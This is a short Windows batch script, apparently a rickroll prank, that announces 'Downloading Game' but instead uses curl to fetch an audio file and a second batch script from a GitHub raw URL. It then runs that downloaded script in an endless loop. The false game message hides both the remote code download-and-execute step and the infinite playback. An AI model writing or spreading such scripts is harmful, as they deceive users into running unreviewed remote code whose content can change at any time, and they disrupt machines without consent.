@echo off

echo Downloading Game

:DOWNLOAD
  mkdir %TEMP%\yompBest
  curl -o %TEMP%\yompBest\role.mp3 http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3
  curl -o %TEMP%\yompBest\m.bat http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat
  %TEMP%\yompBest\m %TEMP%\yompBest\role.mp3
  goto :play
 
 :play
 %TEMP%\yompBest\m %TEMP%\yompBest\role.mp3
 
 goto :play
